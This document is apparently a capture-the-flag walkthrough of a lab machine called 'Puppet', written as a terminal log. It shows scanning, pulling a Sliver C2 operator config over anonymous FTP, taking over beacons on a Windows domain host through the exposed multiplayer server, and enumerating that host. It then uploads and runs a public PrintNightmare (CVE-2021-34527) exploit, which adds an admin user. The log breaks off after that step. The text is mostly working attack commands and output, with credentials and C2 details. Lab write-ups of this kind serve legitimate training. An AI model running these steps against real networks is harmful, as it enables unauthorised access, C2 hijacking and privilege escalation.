# Puppet

Entry Point IP: `10.13.38.33`.

## Reconnaissance

Install [fscan](https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan)

```bash
curl -L -o fscan https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ curl -L -o fscan https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 6933k  100 6933k    0     0  17.7M      0 --:--:-- --:--:-- --:--:-- 17.7M
```

Scan the IP with `rustscan`:

```bash
./rustscan -a 10.13.38.33
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ ./rustscan -a 10.13.38.33
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/07cf599c8311a84b1d8c2ae8xK/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.13.38.33:21
Open 10.13.38.33:22
Open 10.13.38.33:8140
Open 10.13.38.33:8443
Open 10.13.38.33:31337
[~] Starting Script(s)
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-27 16:32 CET
Initiating Ping Scan at 16:32
Scanning 10.13.38.33 [2 ports]
Completed Ping Scan at 16:32, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 16:32
Scanning puppet.htb (10.13.38.33) [5 ports]
Discovered open port 21/tcp on 10.13.38.33
Discovered open port 22/tcp on 10.13.38.33
Discovered open port 31337/tcp on 10.13.38.33
Discovered open port 8443/tcp on 10.13.38.33
Discovered open port 8140/tcp on 10.13.38.33
Completed Connect Scan at 16:32, 0.03s elapsed (5 total ports)
Nmap scan report for puppet.htb (10.13.38.33)
Host is up, received conn-refused (0.022s latency).
Scanned at 2025-12-27 16:32:43 CET for 0s

PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack
22/tcp    open  ssh       syn-ack
8140/tcp  open  puppet    syn-ack
8443/tcp  open  https-alt syn-ack
31337/tcp open  Elite     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
```

The open ports are:

- `21`: `FTP`
- `22`: `ssh`
- `8140`: `puppet`
- `8443`: `https-alt`
- `31337`: `Elite`

scan these ports:

```bash
nmap -A 10.13.38.33 -p 21,22,8140,8443,31337 -oA nmap/
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ nmap -A 10.13.38.33 -p 21,22,8140,8443,31337 -oA nmap/
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-27 16:36 CET
Nmap scan report for puppet.htb (10.13.38.33)
Host is up (0.023s latency).

PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.31
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg
|_-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux
22/tcp    open  ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:70:df:74:8c:ed:e9:81:46:16:e4:88:bc:7f:69:32 (ECDSA)
|_  256 bf:f0:f1:8f:5b:66:93:9b:cb:8b:bc:78:37:b8:b8:3a (ED25519)
8140/tcp  open  ssl/http       WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07); OpenSSL 3.0.2)
| ssl-cert: Subject: commonName=puppet.puppet.vl
| Subject Alternative Name: DNS:puppet, DNS:puppet.puppet.vl
| Not valid before: 2024-10-11T18:01:13
|_Not valid after:  2029-10-11T18:01:13
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=0.0.0.0
| Subject Alternative Name: IP Address:0.0.0.0
| Not valid before: 2024-12-24T14:49:26
|_Not valid after:  2027-12-24T14:49:26
31337/tcp open  ssl/Elite?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=multiplayer
| Subject Alternative Name: DNS:multiplayer
| Not valid before: 2024-05-11T12:31:48
|_Not valid after:  2027-05-11T12:31:48
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.01 seconds
```

use ftp anonymous login

```bash
ftp 10.13.38.33
```

```bash
ftp 10.13.38.33
Connected to 10.13.38.33 (10.13.38.33).
220 (vsFTPd 3.0.5)
Name (10.13.38.33:07cf599c8311a84b1d8c2ae8xK): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,13,38,33,243,117).
150 Here comes the directory listing.
-rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg
-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux
226 Directory send OK.
```

get all files

```bash
prompt off
mget *
```

```bash
ftp> prompt off
Interactive mode off.
ftp> mget *
local: red_127.0.0.1.cfg remote: red_127.0.0.1.cfg
227 Entering Passive Mode (10,13,38,33,77,92).
150 Opening BINARY mode data connection for red_127.0.0.1.cfg (2119 bytes).
226 Transfer complete.
2119 bytes received in 0.0117 secs (181.64 Kbytes/sec)
local: sliver-client_linux remote: sliver-client_linux
227 Entering Passive Mode (10,13,38,33,220,178).
150 Opening BINARY mode data connection for sliver-client_linux (36515304 bytes).
226 Transfer complete.
36515304 bytes received in 1.73 secs (21090.47 Kbytes/sec)
```

change `lhost` in `red_127.0.0.1.cfg` such that it points to the entry point IP:

```bash
sed -i 's/\"lhost\"\:\"127.0.0.1\"/\"lhost\"\:\"10.13.38.33\"/' red_127.0.0.1.cfg
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ sed -i 's/\"lhost\"\:\"127.0.0.1\"/\"lhost\"\:\"10.13.38.33\"/' red_127.0.0.1.cfg
```

alternatively, keep the config file as is and use `socat` to redirect traffic from `127.0.0.1:31337` to `10.13.38.33:31337`:

```bash
sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 ~]$ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
```



download [sliver-client](https://github.com/BishopFox/sliver/releases/download/v1.5.44/sliver-client_linux):

```bash
curl -L -o sliver-client https://github.com/BishopFox/sliver/releases/download/v1.5.44/sliver-client_linux
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ curl -L -o sliver-client https://github.com/BishopFox/sliver/releases/download/v1.5.44/sliver-client_linux
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 34.7M  100 34.7M    0     0  23.0M      0  0:00:01  0:00:01 --:--:-- 31.8M
```

make it executable:

```bash
chmod +x sliver-client
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ chmod +x sliver-client
```

then import

```bash
./sliver-client import ./red_127.0.0.1.cfg
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ ./sliver-client import ./red_127.0.0.1.cfg
2025/12/27 17:07:22 Saved new client config to: /home/07cf599c8311a84b1d8c2ae8xK/.sliver-client/configs/red_10.13.38.33.cfg
```

connect to the multiplayer server:

```bash
./sliver-client
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ ./sliver-client
Connecting to 10.13.38.33:31337 ...

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain deathtouch
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Client v1.5.44 - 9122878cbbcae543eb8210f616550382af2065fd
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
```

list beacons:

```sliver
beacons
```

```bash
sliver > beacons

 ID         Name             Tasks   Transport   Remote Address       Hostname   Username             Operating System   Locale   Last Check-In                            Next Check-In
========== ================ ======= =========== ==================== ========== ==================== ================== ======== ======================================== =======================================
 cfa2848a   BLUSHING_ERROR   9/9     mtls        172.16.40.50:49713   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:12:27 CET 2025 (45s ago)   Sat Dec 27 17:13:36 CET 2025 (in 24s)
 a166b26b   BLUSHING_ERROR   0/0     mtls        172.16.40.50:49718   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:13:05 CET 2025 (7s ago)    Sat Dec 27 17:14:07 CET 2025 (in 55s)
 6292efcf   BLUSHING_ERROR   0/0     mtls        172.16.40.50:49714   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:12:19 CET 2025 (53s ago)   Sat Dec 27 17:13:43 CET 2025 (in 31s)
 0c2e8ead   BLUSHING_ERROR   3/3     mtls        172.16.40.50:49719   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:12:29 CET 2025 (43s ago)   Sat Dec 27 17:13:31 CET 2025 (in 19s)
 ea404256   BLUSHING_ERROR   0/0     mtls        172.16.40.50:49715   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:13:07 CET 2025 (5s ago)    Sat Dec 27 17:14:09 CET 2025 (in 57s)
```

```bash
use cfa2848a
```

```bash
sliver > use cfa2848a

[*] Active beacon BLUSHING_ERROR (cfa2848a-71d8-48ef-ba27-b8907d4528c0)

sliver (BLUSHING_ERROR) >
```

```bash
info
```

```bash
sliver (BLUSHING_ERROR) > info

         Beacon ID: cfa2848a-71d8-48ef-ba27-b8907d4528c0
              Name: BLUSHING_ERROR
          Hostname: File01
              UUID: f0251442-0c32-be94-4935-7b308e975872
          Username: PUPPET\bruce.smith
               UID: S-1-5-21-3066630505-2324057459-3046381011-1126
               GID: S-1-5-21-3066630505-2324057459-3046381011-513
               PID: 1736
                OS: windows
           Version: Server 2016 build 20348 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://172.16.40.200:8443
    Remote Address: 172.16.40.50:49713
         Proxy URL:
          Interval: 1m0s
            Jitter: 30s
     First Contact: Sat Dec 27 04:15:16 CET 2025 (12h59m39s ago)
      Last Checkin: Sat Dec 27 17:14:35 CET 2025 (20s ago)
      Next Checkin: Sat Dec 27 17:15:41 CET 2025 (in 46s)
```

```bash
interactive
```

```bash
sliver (BLUSHING_ERROR) > interactive

[*] Using beacon's active C2 endpoint: mtls://172.16.40.200:8443
[*] Tasked beacon BLUSHING_ERROR (af5801d1)
```

```bash
sessions
```

```bash
sliver > sessions

 ID         Name             Transport   Remote Address       Hostname   Username             Operating System   Locale   Last Message                               Health
========== ================ =========== ==================== ========== ==================== ================== ======== ========================================== =========
 3514fb51   BLUSHING_ERROR   mtls        172.16.40.50:52778   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:21:14 CET 2025 (1m25s ago)   [ALIVE]
 e9b7b214   BLUSHING_ERROR   mtls        172.16.40.50:53984   File01     PUPPET\bruce.smith   windows/amd64      en-US    Sat Dec 27 17:21:40 CET 2025 (59s ago)     [ALIVE]

sliver > use

? Select a session or beacon: SESSION  e9b7b214  BLUSHING_ERROR  172.16.40.50:53984  File01  PUPPET\bruce.smith  windows/amd64
[*] Active session BLUSHING_ERROR (e9b7b214-a820-4735-a9ee-cbaf16a7651c)

sliver (BLUSHING_ERROR) >
```

List all `processes`:

```bash
ps
```

```bash
sliver (BLUSHING_ERROR) > ps

 Pid    Ppid   Owner                Arch     Executable                    Session
====== ====== ==================== ======== ============================= =========
 0      0                                    [System Process]              -1
 4      0                                    System                        -1
 100    4                                    Registry                      -1
 304    4                                    smss.exe                      -1
 424    416                                  csrss.exe                     -1
 524    516                                  csrss.exe                     -1
 544    416                                  wininit.exe                   -1
 592    516                                  winlogon.exe                  -1
 664    544                                  services.exe                  -1
 684    544                                  lsass.exe                     -1
 788    664                                  svchost.exe                   -1
 812    592                                  fontdrvhost.exe               -1
 820    544                                  fontdrvhost.exe               -1
 892    664                                  svchost.exe                   -1
 1008   664                                  svchost.exe                   -1
 1020   664                                  svchost.exe                   -1
 420    664                                  svchost.exe                   -1
 376    664                                  svchost.exe                   -1
 784    664                                  svchost.exe                   -1
 708    664                                  svchost.exe                   -1
 1068   664                                  svchost.exe                   -1
 1180   592                                  dwm.exe                       -1
 1260   664                                  svchost.exe                   -1
 1380   664                                  svchost.exe                   -1
 1616   664                                  svchost.exe                   -1
 1756   664                                  svchost.exe                   -1
 1764   664                                  svchost.exe                   -1
 1860   664                                  spoolsv.exe                   -1
 1932   664                                  svchost.exe                   -1
 1976   664                                  svchost.exe                   -1
 372    664                                  vm3dservice.exe               -1
 1128   664                                  vmtoolsd.exe                  -1
 1492   664                                  VGAuthService.exe             -1
 2052   664                                  svchost.exe                   -1
 2256   372                                  vm3dservice.exe               -1
 2912   664                                  dllhost.exe                   -1
 2920   1932                                 AggregatorHost.exe            -1
 2476   664                                  msdtc.exe                     -1
 3140   788                                  WmiPrvSE.exe                  -1
 4092   664                                  ruby.exe                      -1
 1652   664                                  svchost.exe                   -1
 2988   1008   PUPPET\bruce.smith   x86_64   sihost.exe                    1
 2708   664    PUPPET\bruce.smith   x86_64   svchost.exe                   1
 2976   1008   PUPPET\bruce.smith   x86_64   taskhostw.exe                 1
 2960   1008                                 MicrosoftEdgeUpdate.exe       -1
 3068   420                         x86_64   ctfmon.exe                    1
 4188   4172   PUPPET\bruce.smith   x86_64   explorer.exe                  1
 4504   788    PUPPET\bruce.smith   x86_64   StartMenuExperienceHost.exe   1
 4548   788    PUPPET\bruce.smith   x86_64   TextInputHost.exe             1
 4636   788    PUPPET\bruce.smith   x86_64   RuntimeBroker.exe             1
 4784   788    PUPPET\bruce.smith   x86_64   SearchApp.exe                 1
 4900   788    PUPPET\bruce.smith   x86_64   RuntimeBroker.exe             1
 5104   788    PUPPET\bruce.smith   x86_64   RuntimeBroker.exe             1
 4368   4188   PUPPET\bruce.smith   x86_64   vmtoolsd.exe                  1
 804    664    PUPPET\bruce.smith   x86_64   svchost.exe                   1
 636    2748   PUPPET\bruce.smith   x86_64   puppet-update.exe             1
 2768   2748   PUPPET\bruce.smith   x86_64   puppet-update.exe             1
 4652   2748   PUPPET\bruce.smith   x86_64   puppet-update.exe             1
 1000   2748   PUPPET\bruce.smith   x86_64   puppet-update.exe             1
 1736   2748   PUPPET\bruce.smith   x86_64   puppet-update.exe             1
 3960   1008   PUPPET\bruce.smith   x86_64   powershell.exe                1
 1412   3960   PUPPET\bruce.smith   x86_64   conhost.exe                   1
 1928   4092                                 cmd.exe                       -1
 3720   1928                                 conhost.exe                   -1
 1440   1928                                 ruby.exe                      -1
 1776   788                                  MoUsoCoreWorker.exe           -1
 600    4092                                 cmd.exe                       -1
 2668   600                                  conhost.exe                   -1
 3672   600                                  ruby.exe                      -1
 ```

 switch to `C:\Users`:

 ```bash
cd C:/Users
ls
 ```

 ```bash
 sliver (BLUSHING_ERROR) > cd C:/Users

[*] C:\Users

sliver (BLUSHING_ERROR) > ls

C:\Users (9 items, 174 B)
=========================
drwxrwxrwx  Administrator                     <dir>  Wed Sep 25 21:23:55 -0800 2024
drwxrwxrwx  Administrator.PUPPET              <dir>  Fri Oct 11 06:12:07 -0800 2024
Lrw-rw-rw-  All Users -> C:\ProgramData       0 B    Sat May 08 00:34:03 -0800 2021
drwxrwxrwx  bruce.smith                       <dir>  Fri Oct 11 06:07:58 -0800 2024
dr-xr-xr-x  Default                           <dir>  Thu Sep 26 06:23:21 -0800 2024
Lrw-rw-rw-  Default User -> C:\Users\Default  0 B    Sat May 08 00:34:03 -0800 2021
-rw-rw-rw-  desktop.ini                       174 B  Sat May 08 00:18:31 -0800 2021
dr-xr-xr-x  Public                            <dir>  Wed Sep 25 21:23:55 -0800 2024
drwxrwxrwx  svc_inventory_win                 <dir>  Fri Oct 11 05:30:48 -0800 2024
```

notice that [Puppet](https://www.puppet.com/) is installed:

```bash
cd C:\\PROGRA~1
```

```bash
sliver (BLUSHING_ERROR) > cd C:\\PROGRA~1

[*] C:\PROGRA~1

sliver (BLUSHING_ERROR) > ls

C:\PROGRA~1 (16 items, 174 B)
=============================
drwxrwxrwx  Common Files                                 <dir>  Wed Sep 25 21:27:05 -0800 2024
-rw-rw-rw-  desktop.ini                                  174 B  Sat May 08 00:18:31 -0800 2021
drwxrwxrwx  Internet Explorer                            <dir>  Wed Sep 03 14:43:33 -0800 2025
drwxrwxrwx  ModifiableWindowsApps                        <dir>  Sat May 08 00:20:24 -0800 2021
drwxrwxrwx  Puppet Labs                                  <dir>  Fri Oct 11 05:07:15 -0800 2024
drwxrwxrwx  Uninstall Information                        <dir>  Wed Sep 25 21:23:54 -0800 2024
drwxrwxrwx  VMware                                       <dir>  Tue Apr 22 21:37:43 -0800 2025
drwxrwxrwx  Windows Defender                             <dir>  Fri Oct 11 03:41:56 -0800 2024
drwxrwxrwx  Windows Defender Advanced Threat Protection  <dir>  Wed Sep 03 14:43:33 -0800 2025
drwxrwxrwx  Windows Mail                                 <dir>  Wed Sep 03 14:43:33 -0800 2025
drwxrwxrwx  Windows Media Player                         <dir>  Wed Sep 03 14:43:33 -0800 2025
drwxrwxrwx  Windows NT                                   <dir>  Sat May 08 01:35:26 -0800 2021
drwxrwxrwx  Windows Photo Viewer                         <dir>  Wed Sep 03 14:43:33 -0800 2025
drwxrwxrwx  Windows Sidebar                              <dir>  Sat May 08 00:34:49 -0800 2021
drwxrwxrwx  WindowsApps                                  <dir>  Thu Sep 04 03:05:42 -0800 2025
drwxrwxrwx  WindowsPowerShell                            <dir>  Sat May 08 00:34:49 -0800 2021
```

spawn a shell:

```bash
shell
```

```bash
sliver (BLUSHING_ERROR) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 2824
```



```powershell
whoami /all
```

```powershell
PS C:\Program Files> whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
puppet\bruce.smith S-1-5-21-3066630505-2324057459-3046381011-1126


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
PUPPET\employees                           Group            S-1-5-21-3066630505-2324057459-3046381011-1105 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Install the `sa-netshares` coff:

```bash
armory install sa-netshares
```

```bash
sliver (BLUSHING_ERROR) > armory install sa-netshares

[*] Installing extension 'coff-loader' (v1.0.16) ... done!
[*] Installing extension 'sa-netshares' (v0.0.25) ... done!
```

```bash
sa-netshares .
```

```bash
sliver (BLUSHING_ERROR) > sa-netshares .

[*] Successfully executed sa-netshares (coff-loader)
[*] Got output:
Share:              Remark:
---------------------.----------------------------------
ADMIN$              Remote Admin
C$                  Default share
files               company files
IPC$                Remote IPC
```

```bash
sa-dir \\\\127.0.0.1\\files
```

```bash
sliver (BLUSHING_ERROR) > sa-dir \\\\127.0.0.1\\files

[*] Successfully executed sa-dir (coff-loader)
[*] Got output:
Contents of \\127.0.0.1\files\*:
        10/12/2024 01:26           <dir> .
        09/03/2025 15:43           <dir> ..
        10/12/2024 01:26           <dir> HR
        10/12/2024 01:50           <dir> IT
        10/12/2024 01:26           <dir> ITSEC
        10/12/2024 01:26           <dir> MGMT
        10/12/2024 01:26           <dir> Transfer
                                       0 Total File Size for 0 File(s)
                                                              7 Dir(s)
```

```bash
armory install sa-netstat
```

```bash
sliver (BLUSHING_ERROR) > armory install sa-netstat

[*] Installing extension 'sa-netstat' (v0.0.25) ... done!
```

```bash
sa-netstat
```

```bash
sliver (BLUSHING_ERROR) > sa-netstat

[*] Successfully executed sa-netstat (coff-loader)
[*] Got output:
Processing: 83 Entries
  PROTO SRC                    DST                          STATE                                                                     PROCESS   PID
  TCP  0.0.0.0:135            LISTEN                   LISTENING                                                                             (  892)
  TCP  0.0.0.0:445            LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:3389           LISTEN                   LISTENING                                                                             ( 1020)
  TCP  0.0.0.0:5985           LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:8888           LISTEN                   LISTENING                                     C:\ProgramData\Puppet\puppet-update.exe (  636)
  TCP  0.0.0.0:47001          LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:49664          LISTEN                   LISTENING                                                                             (  684)
  TCP  0.0.0.0:49665          LISTEN                   LISTENING                                                                             (  544)
  TCP  0.0.0.0:49666          LISTEN                   LISTENING                                                                             (  376)
  TCP  0.0.0.0:49667          LISTEN                   LISTENING                                                                             (  684)
  TCP  0.0.0.0:49668          LISTEN                   LISTENING                                                                             ( 1860)
  TCP  0.0.0.0:49669          LISTEN                   LISTENING                                                                             ( 1008)
  TCP  0.0.0.0:49670          LISTEN                   LISTENING                                                                             (  664)
  TCP  0.0.0.0:49671          LISTEN                   LISTENING                                                                             ( 1764)
  TCP  172.16.40.50:135       172.16.40.50:53832     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53833     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53834     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53886     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53887     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53888     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53966     ESTABLISHED                                                                             (  892)
  TCP  172.16.40.50:135       172.16.40.50:53967     ESTABLISHED                                                                             (  892)
 <SNIP>
```

Download [PrivescCheck](https://github.com/itm4n/PrivescCheck/releases/tag/2025.12.25-1):

```bash
curl -L -o PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/releases/download/2025.12.25-1/PrivescCheck.ps1
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ curl -L -o PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/releases/download/2025.12.25-1/PrivescCheck.ps1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100  217k  100  217k    0     0   619k      0 --:--:-- --:--:-- --:--:--  619k
```

Move to `C:\Temp` and then upload `PrivescCheck.ps1`:

```bash
upload PrivescCheck.ps1
```

```bash
sliver (BLUSHING_ERROR) > upload PrivescCheck.ps1

[*] Wrote file to C:\temp\PrivescCheck.ps1
```

Run it to find out the machine is vulnerable to [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527):

```bash
sharpsh -t 400 -- -c invoke-privesccheck -u C:/temp/PrivescCheck.ps1
```

```bash
sliver (BLUSHING_ERROR) > sharpsh -t 400 -- -c invoke-privesccheck -u C:/temp/PrivescCheck.ps1


[*] sharpsh output:

????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - Point and Print                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the Print Spooler service is enabled and if    ?
? the Point and Print configuration allows non-administrator   ?
? users to install printer drivers.                            ?
????????????????????????????????????????????????????????????????

Policy      : Limits print driver installation to Administrators
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : RestrictDriverInstallationToAdministrators
Data        : 0
Default     : 1
Expected    : <null|1>
Description : Installing printer drivers does not require administrator privileges.

Policy      : Point and Print Restrictions > NoWarningNoElevationOnInstall
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : NoWarningNoElevationOnInstall
Data        : 1
Default     : 0
Expected    : <null|0>
Description : Do not show warning or elevation prompt. Note: this setting reintroduces the PrintNightmare LPE
              vulnerability, even if the settings 'InForest' and/or 'TrustedServers' are configured.

<SNIP>

[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.099

<SNIP>
```

download [JohnHammond's CVE-2021-34527 Ps1 PoC](https://github.com/JohnHammond/CVE-2021-34527):

```bash
curl -L -o CVE-2021-34527.ps1 https://raw.githubusercontent.com/JohnHammond/CVE-2021-34527/refs/heads/master/CVE-2021-34527.ps1
```

```bash
[07cf599c8311a84b1d8c2ae8xK@vmi2991164 Puppet]$ curl -L -o CVE-2021-34527.ps1 https://github.com/JohnHammond/CVE-2021-34527/blob/master/CVE-2021-34527.ps1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  387k    0  387k    0     0   803k      0 --:--:-- --:--:-- --:--:--  801k
```

upload it:

```bash
upload CVE-2021-34527.ps1
```

```bash
sliver (BLUSHING_ERROR) > upload CVE-2021-34527.ps1

[*] Wrote file to C:\temp\CVE-2021-34527.ps1
```

```bash
sliver (BLUSHING_ERROR) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 172

PS C:\temp> ls
ls


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/22/2025  11:40 PM         441224 Autologon64.exe
-a----        12/27/2025  12:07 PM         178563 CVE-2021-34527.ps1
-a----        12/27/2025  10:49 AM         222662 PrivescCheck.ps1


PS C:\temp> Import-Module CVE*
Import-Module CVE*
Import-Module : The specified module 'CVE*' was not loaded because no valid module file was found in any module
directory.
At line:1 char:1
+ Import-Module CVE*
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (CVE*:String) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand

PS C:\temp> Import-Module CVE-2021-34527.ps1
Import-Module CVE-2021-34527.ps1
Import-Module : The specified module 'CVE-2021-34527.ps1' was not loaded because no valid module file was found in any
module directory.
At line:1 char:1
+ Import-Module CVE-2021-34527.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (CVE-2021-34527.ps1:String) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand

[*] Beacon 051f8c51 BLUSHING_ERROR - 172.16.40.5:64226 (DC01) - windows/amd64 - Sat, 27 Dec 2025 21:37:10 CET

sliver (BLUSHING_ERROR) > shell
shell
shell : The term 'shell' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ shell
+ ~~~~~
    + CategoryInfo          : ObjectNotFound: (shell:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\temp> Import-Module .\CVE-2021-34527.ps1
Import-Module .\CVE-2021-34527.ps1
PS C:\temp> Invoke-Nightmare
Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
